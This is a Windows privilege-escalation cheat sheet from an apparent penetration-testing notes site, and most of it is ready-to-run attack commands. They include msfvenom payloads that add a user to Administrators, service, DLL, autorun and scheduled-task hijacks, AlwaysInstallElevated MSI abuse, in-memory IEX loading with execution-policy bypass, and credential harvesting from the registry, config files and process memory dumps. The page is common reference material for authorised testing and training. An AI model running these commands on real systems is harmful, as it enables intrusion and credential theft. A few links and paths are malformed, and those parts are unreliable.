---
layout: default
title: Windows
parent: Privilege Escalation
---

# Windows Privilege Escalation
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

Setting up a lower priv user for authenticated assessments
```powershell
net user [username] [password] /add     # Create new user
net localgroup [group] [username] /add  # Add to desired group, may need a localgroup to allow logon
runas /user:[username] powershell.exe   # Run PowerShell as user
net user [username] /delete             # Delete when finished
```
## Automated Checks
### PowerUp
PowerUp.ps1.b64
```powershell
powershell.exe -nop -exec bypass
IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content -Path .\PowerUp.ps1.b64))))
Invoke-AllChecks -ErrorAction SilentlyContinue | Out-File -Encoding ASCII powerup.log
```

### [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
```powershell
.\winPEAS.exe
```

---

## Services
### Find Non-Standard Services
[Seatbelt](https://github.com/GhostPack/Seatbelt)
```powershell
Seatbelt.exe NonstandardServices
```

[Get-NonstandardService.ps1](https://gist.github.com/HarmJ0y/7363509435f5700d713ee351bb4fcd8f)
```powershell
powershell -ep bypass -nol -noni -nop
Import-Module <path to Get-NonstandardService.ps1>
Get-NonstandardService
```

<https://powershelladministrator.com/2014/04/28/get-all-non-default-windows-services/>
```powershell
$NonDefaultServices = Get-wmiobject win32_service | where { $_.Caption -notmatch "Windows" -and $_.PathName -notmatch "Windows" -and $_.PathName -notmatch "policyhost.exe" -and $_.Name -ne "LSM" -and $_.PathName -notmatch "OSE.EXE" -and $_.PathName -notmatch "OSPPSVC.EXE" -and $_.PathName -notmatch "Microsoft Security Client" }
```

---

### DLL Hijacking
Using procmon ([Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite))
- `Ctrl-L` → `Process Name is <process name>`
- `Ctrl-H` → `Result is "NAME NOT FOUND"`
- Run the service and check for any files that the process tried to execute but couldn't find
- Create a .dll file which executes the command desired e.g. `cmd.exe /k net localgroup administrators user /add`
- Or use msfvenom to generate a .dll that spawns a shell or executes a command
```shell
msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f dll -o <missing .dll name>.dll
msfvenom -p <payload> <payload params> -f dll -o <missing .dll name>.dll
```
- Start/restart service
```powershell
sc stop <service>
sc start <service>
```

Using PowerUp.ps1
```powershell
Import-Module <PowerUp.ps1 path>
Find-ProcessDLLHijack  # Processes which are trying to load missing DLLs
Find-PathDLLHijack     # Paths in which the user can modify the content
Write-HijackDll        # Create hijacking dll, will need to provide path
```
- Start/restart service
```powershell
sc stop <service>
sc start <service>
```

---

### Unquoted Paths
Find unquoted service paths
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """  # CMD
wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows\' |findstr /i /v '\"'  # PowerShell
```

Check whether you can write to any directories in the path to add an executable
```powershell
icacls <path>        # CMD, cacls XP/2003 and earlier
Get-Acl <path> | fl  # PowerShell
```

Exploit execute CMD or spawn shell
```powershell
msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f exe-service -o <file name>.exe
msfvenom -p <payload> <payload params> -f exe-service -o <file name>.exe
```

Start/restart service
```powershell
sc stop <service>
sc start <service>
```

---

### Named Pipes
Requires SeImpersonatePrivilege
- Check for current user
```powershell
whoami /priv
```
- Check for all users ([converting SIDs](http://woshub.com/hot-to-convert-sid-to-username-and-vice-versa/))
```powershell
secedit /export /areas USER_RIGHTS /cfg <output file>  # Output as SIDs, not usernames
wmic useraccount where sid='<sid>' get name            # CMD, local user SID
Get-ADUser -Identity <sid>                             # PS, AD user SID (requires RSAT tools)
```
- [Well knows SIDs](https://support.microsoft.com/en-au/help/243330/well-known-security-identifiers-in-windows-operating-systems)

Exploit using [pipeserverimpersonate.ps1](https://github.com/decoder-it/pipeserverimpersonate)
```powershell
.\pipeserverimpersonate.ps1
```
- <https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/>

List named pipes
```powershell
Get-ChildItem \\.\pipe\
Get-ChildItem \\.\pipe\<pipename>
```



---

### Registry
Check registry permissions for ability to add/remove/update
```powershell
Get-Acl <path> | fl
Get-Acl hklm:\System\CurrentControlSet\services\* | select Path,AccessToString | fl
Get-Acl hklm:\System\CurrentControlSet\services\* | fl | Out-String -Stream | sls "Users Allow  FullControl" -Context 5,5
accesschk[64].exe [username] -wvuks hklm\System\CurrentControlSet\services  # recurse, username can be a group e.g. "Everyone"
```

Exploitation
```powershell
reg add <path> /v <value> /t <type> /d <data> /f
```
- Path example `HKLM\SYSTEM\CurrentControlSet\services\svc`
- Exploitation is context dependent, e.g. service may load file at path specified in registry which you can control

Type | Description
--- | ----
`REG_SZ` | (default) null-terminated string
`REG_MULTI_SZ` | seq of null-terminated strings, terminated by an empty string, e.g. `Str0\0Str1\0Str2\0\0`
`REG_EXPAND_SZ` | null-terminated string containing unexpanded refs to env vars, e.g. `%PATH%`
`REG_DWORD` | 32-bit number
`REG_QWORD` | 64-bit number
`REG_BINARY` | binary data
`REG_NONE` | no defined value type

Start/restart service
```powershell
sc stop <service>
sc start <service>
```

---

### Executable File
Check if you have permission to modify executable files
```powershell
accesschk[64].exe [username] -wvu <path>  # -s to recurse
Get-ModifiableServiceFile                 # PowerUp.ps1
```

Exploit by replacing the file with your own
```powershell
msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f exe -o <file name>.exe
msfvenom -p <payload> <payload params> -f exe -o <file name>.exe
Invoke-ServiceAbuse -Name <service>  # PowerUp.ps1
exploit/windows/local/service_permissions
```

Start/restart service
```powershell
sc stop <service>
sc start <service>
```

---

### binPath
Check for "SERVICE_CHANGE_CONFIG" permission
```powershell
accesschk[64].exe [username] -wvuc [service|*]  # username can be a group e.g. "Everyone"
Get-ModifiableService                           # PowerUp.ps1
```
- Look out for:
    - `SERVICE_CHANGE_CONFIG`
    - `SERVICE_ALL_ACCESS`
    - `GENERIC_WRITE`
    - `GENERIC_ALL`
    - `WRITE_DAC`
    - `WRITE_OWNER`

Change binPath to exploit
```powershell
sc config <service> binpath="net localgroup administrators user /add"
sc config <service> binpath=<binary path>
```
```powershell
Invoke-ServiceAbuse -Name <service name> -Command <cmd>  # PowerUp.ps1
```

Start/restart service
```powershell
sc stop <service>
sc start <service>
```

---

## Kernel
### Automated
[Watson](https://github.com/rasta-mouse/Watson)
```powershell
Watson.exe
```
- Requires compilation (.NET)
- Supports:
    - Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809
    - Server 2016 and 2019
- For older OSes try Sherlock

[Sherlock](https://github.com/sherlock-project/sherlock) (Deprecated, replaced by Watson)
```powershell
powershell -nop -ep bypass
Import-Module <path to Sherlock.ps1>
Find-AllVulns
```

Metasploit
```powershell
use post/windows/gather/enum_patches
set SESSION <session ID>
set KB <comma-separated KBs>
run
```

[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
```powershell
./windows-exploit-suggester.py --update  # Will download .xlsx database file
systeminfo > systeminfo.txt
./windows-exploit-suggester.py --database <db .xlsx file> --systeminfo systeminfo.txt
```
- Can get possible exploits for OS without hotfix data (OS name from `systeminfo`), e.g.
```powershell
./windows-exploit-suggester.py --database <db .xlsx file> --ostext 'windows server 2008 r2'
```

### Manual
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
Get-HotFix | Sort-Object HotFixID
```
- [Windows Update Catalog](https://www.catalog.update.microsoft.com/Home.aspx)

---

## Password Mining
### Automated
[LaZagne Releases](https://github.com/AlessandroZ/LaZagne/releases/)
```powershell
lazagne.exe all
```

### Registry
PuTTY
```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\BWP123F42" /v ProxyUsername
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\BWP123F42" /v ProxyPassword
reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
```

AutoLogon
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
Get-RegAutoLogon                                   # PowerUp.ps1
post/windows/gather/credentials/windows_autologin  # Metasploit
```

VNC
```powershell
reg query "HKEY_CURRENT_USER\Software\TightVNC\Server" /v Password
reg query "HKEY_CURRENT_USER\Software\TightVNC\Server" /v PasswordViewOnly
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
./vncpwd.exe [encrypted password]
```
- <https://github.com/jeroennijhof/vncpwd>

SNMP
```powershell
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

General
```powershell
reg query HKLM /f passw /t REG_SZ /s
reg query HKCU /f passw /t REG_SZ /s
```

---

### cmdkey
```powershell
cmdkey /list
```
- If there is an entry for a user, can `runas /savecred /user:<user> <program>`

---

### RDP Files
```powershell
dir /s /b *.rdp
```

---

### Session Information
[Session Gopher](https://github.com/Arvanaghi/SessionGopher)
```powershell
Import-Module <SessionGopher.ps1 path>
Invoke-SessionGopher -AllDomain -o                   # Using current account
Invoke-SessionGopher -AllDomain -u <user> -p <pass>  # Using another account
```
- `-Thorough` searches all drives for PuTTY private keys (.ppk), .rdp and RSA (.sdtid) files
- `-Target <target>` for specific target or `-iL <file>` for list of hosts
- Finds and decrypts saved session info for remote access tools by checking `HKEY_USERS` hive for all users who have logged onto a domain-joined box

---

### Memory
Process Dump
- On Kali
```powershell
msfconsole
use auxiliary/server/capture/http_basic
set uripath x
run
```

- On Windows
    - Using Internet Explorer, navigate to `http://<kali ip>/x`
    - Create dump of `iexplore.exe`
        - `procdump.exe -ma iexplore.exe <output path>`
        - `.\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 <output path> full`
        - Task Manager Processes > iexplore.exe > Create Dump File

- Extract creds
```powershell
strings <iexplore.exe dump> | grep "Authorization: Basic"
echo -ne <b64 encoded creds> | base64 -d
```

---

[Mimikittenz](https://github.com/putterpanda/mimikittenz)
```powershell
Import-Module <Invoke-mimikittenz.ps1 path>
Invoke-mimikittenz
```

Category | Supported
:--- | :---
Webmail | Gmail Office365 Outlook Web
Accounting | Xero MYOB
Remote Access | Juniper SSL-VPN Citrix NetScaler Remote Desktop Web Access 2012
Developement | Jira Github Bugzilla Zendesk Cpanel
IHateReverseEngineers | Malwr VirusTotal AnubisLabs
Misc | Dropbox Microsoft Onedrive AWS Web Services Slack Twitter Facebook

---

### Configuration/Log Files
unattend.xml
- `C:\unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`
```powershell
post/windows/gather/enum_unattend  # Metasploit
Get-UnattendedInstallFile          # PowerUp.ps1
```
- Save base64-encoded password from between `<password>` tags to file
```powershell
certutil -decode <input file> <output file> >nul & type <output file>
```

SiteList.xml
- `%AllUsersProfile%\Application Data\McAfee\Common Framework\SiteList.xml`
```powershell
Get-SiteListPassword  # PowerUp.ps1
```
```powershell
./mcafee_sitelist_pwd_decrypt.py <encrypted password>
```
- [mcafee_sitelist_pwd_decrypt.py](https://github.com/funoverip/mcafee-sitelist-pwd-decryption/blob/master/mcafee_sitelist_pwd_decrypt.py)

web.config
```powershell
dir /s /b C:\inetpub\*web.config
Get-Webconfig  # PowerUp.ps1
```

vnc.ini  (may be base64-encoded)
```powershell
dir /s /b c:\*vnc.ini
dir /s /b c:\*ultravnc.ini
dir /s /b c:\ | findstr /si *vnc.ini
```

General
```powershell
findstr /si passw *.bat *.cmd *.csv *.dat *.eml *.evt *.inf *.ini *.log *.ps1 *.sav *.sys *.txt *.vbs *.xml
dir /s /b *pass* == *cred* == *vnc* == *.config*
```

---

### Cached SAM
- `C:\Windows\Repair` (Win XP)

---

## Registry
### Autorun
Search for modifiable directories which have autoruns
- Autoruns[64].exe [Sysinternal Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
    - Logon tab, view the configured autoruns noting their paths to check permissions

```powershell
Get-ModifiableRegistryAutoRun  # PowerUp.ps1
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
```

```powershell
accesschk[64].exe -wvu <autorun .exe>
```
- Check whether you can modify the file

Exploit
```powershell
msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f exe -o <autorun .exe file>.exe
msfvenom -p <payload> <payload params> -f exe -o <autorun .exe file>.exe
```
- Replace autorun file with your payload .exe and wait for an admin user to log in to trigger the autorun

---

### AlwaysInstallElevated
Check if enabled
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- Enabled if `1`

Create .msi file to be executed
```powershell
msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f msi-nouac -o setup.msi
msfvenom -p <payload> <payload params> -f msi-nouac -o setup.msi
```
- Place in directory such as `C:\Temp`

Execute .msi file
```powershell
msiexec /quiet /qn /i <setup.msi path>
```

---

## Scheduled Tasks
### Binary Overwrite
Check for overwritable binaries
- Autoruns[64].exe [Sysinternal Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
    - Scheduled Tasks tab, note file paths
```powershell
schtasks.exe /query
Get-ModifiableScheduledTaskFile  # PowerUp.ps1
```

Check if you have write access to the binary
```powershell
accesschk[64].exe -w <missing binary directory>
```

Create binary payload
```powershell
msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f exe -o <missing binary>.exe
msfvenom -p <payload> <payload params> -f exe -o <missing binary>.exe
```
- Wait for scheduled task to be executed

---

### Missing Binary
Check for missing binaries of scheduled tasks
- Autoruns[64].exe [Sysinternal Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
    - Scheduled Tasks tab, note file paths, check if any are missing

Check if you have write access to the directory of the missing binary
```powershell
accesschk[64].exe -w <missing binary directory>
```

Create binary payload
```powershell
msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f exe -o <missing binary>.exe
msfvenom -p <payload> <payload params> -f exe -o <missing binary>.exe
```
- Wait for scheduled task to be executed

---

## Hot Potato
[Tater.ps1](https://github.com/Kevin-Robertson/Tater>
```powershell
powershell -nop -ep bypass
Import-Module <Tater.ps1 path>
Invoke-Tater -Trigger 1 -Command <cmd>
```

---

## Startup Applications
TODO

---

## Manual Checks
### OS
```powershell
systeminfo
hostname
net users            # Users
net user <username>  # User information
```

### Networking
```powershell
ipconfig /all              # Network interfaces
route print                # Routing table
arp -A                     # ARP cache for all interfaces
netstat -ano               # Network connections; -anob if admin
netsh firewall show state  # Firewall rules
netsh firewall show config
```

### Applications
```powershell
schtasks /query /fo LIST /v  # Scheduled tasks
tasklist /SVC                # Running processes and services
net start                    # Windows services
DRIVERQUERY                  # Drivers
```

### File system
Unquoted service paths
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””  # CMD
wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows\' |findstr /i /v '\"'  # PowerShell
```

Search for string (e.g. passwords - case insensitive)
```powershell
Get-ChildItem -Path <path> -Recurse -Force -ErrorAction SilentlyContinue | Select-String -Pattern <pattern> | Select path,filename,linenumber,line
```
- Select-String can:
    - `-Include` files as a comma separated list, e.g. `'*.txt','*.csv'`
    - `-Excluse` files as a comma separated list, e.g. `'*.exe','*.dll','*.msi','*.java','*.jar'`; useful for ignoring binaries

Search filesystem (case insensitive)
```powershell
Get-ChildItem -Path <path> -Recurse -Force -ErrorAction SilentlyContinue -Include <search>  # -File to only search for files
```

Access control lists (permissions)
```powershell
Get-Acl | fl  # -Path <path> for directory other than current
icacls <path>
```

| Type | Abbreviation | Full |
|--- | --- | --- |
| Inheritance Settings | OI | Object Inherit |
| | CI | Container Inherit |
| | IO | Inherit Only |
| | NP | Don't propagate inherit |
| | I | Permission inherited from parent container |
| Basic Access Permissions | D | Delete |
| | F | Full |
| | N | No |
| | M | Modify |
| | RX | Read and Execute |
| | R | Read-only |
| | W | Write-only |
| Detailed Permissions | DE | Delete |
| | RC | Read Control |
| | WDAC | Write DAC |
| | WO | Write Owner |
| | S | Synchronise |
| | AS | Access System Security|
| | MA | Maximum Allowed Permissions |
| | GR | Generic Read |
| | GW | Generic Write |
| | GE | Generic Execute |
| | GA | Generic All |
| | RD | Read Data/List Directory |
| | WD | Write Data/Add File |
| | AD | Append Data/Add Subdirectory |
| | REA | Read Extended Attributes |
| | WEA | Write Extended Attributes |
| | X | Execute/Traverse |
| | DC | Delete Child |
| | RA | Read Attributes |
| | WA | Write Attributes |

```powershell
forfiles /P directory /S /D +<dd/mm/yyyy>  # Files modified since date (date /t or echo %date% to check date format)
Dir <root directory> -r | ? {! $_.PSIsContainer -AND $_.lastwritetime -ge '<dd/mm/yy>'} 
```

### WMIC
[FuzzySecurity .bat script for extracting relevant info using WMIC](http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar)

System Patches
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## References
- <https://github.com/sagishahar/lpeworkshop>
- <https://www.fuzzysecurity.com/tutorials/16.html>